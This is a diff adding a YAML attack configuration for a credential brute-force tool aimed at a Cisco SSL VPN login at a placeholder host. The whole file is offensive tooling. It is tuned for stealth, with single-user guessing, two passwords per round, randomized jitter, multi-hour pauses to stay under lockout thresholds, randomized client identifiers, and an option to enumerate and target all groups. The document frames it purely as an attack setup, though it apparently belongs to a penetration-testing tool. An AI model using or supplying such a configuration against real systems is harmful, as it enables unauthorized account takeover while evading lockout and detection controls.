@@ -1,0 +1,36 @@
+database: cisco_ssl_vpn.db
+brute-force:
+
+  # =====================
+  # ATTACK CONFIGURATIONS
+  # =====================
+  #
+  # This attack configuration is conservative:
+  #
+  # - Guesses only 1 user at a time
+  # - Two passwords for that user
+  # - 1-5 seconds rest between guesses
+  # - 1.5-2 hour wait between guess rounds
+  # - Randomized client ID
+  # - Randomized resource URL
+
+  log-file: cisco_ssl_vpn.log
+
+  stop-on-valid: false
+  parallel-guess-count: 1
+  auth-threshold: 2
+
+  auth-jitter-min: 1s
+  auth-jitter-max: 5s
+
+  threshold-jitter-min: 1.5h
+  threshold-jitter-max: 2h
+
+  module:
+    name: http.cisco_ssl_vpn
+    args:
+      url: https://vpn.somehost.com
+      # Set to BRUTE_ALL to enumerate and target all groups
+      groups: Group1 Group2 Group3
+      proxies: https:http://127.0.0.1:8080
+
